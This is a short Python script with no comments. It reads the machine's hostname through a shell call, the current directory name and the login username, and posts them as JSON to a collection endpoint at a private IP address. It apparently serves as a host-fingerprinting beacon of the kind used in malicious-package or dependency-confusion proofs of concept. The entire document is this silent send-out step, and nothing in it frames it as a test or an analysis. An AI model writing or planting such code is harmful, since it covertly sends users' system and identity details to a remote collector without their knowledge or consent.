import os
import requests

host_user = {
    "hostname": os.popen("hostname").read().strip(),
    "directory": os.path.basename(os.getcwd()),
    "username": os.getlogin(),
}
requests.post("http://192.168.10.20:8000/collect", json=host_user)
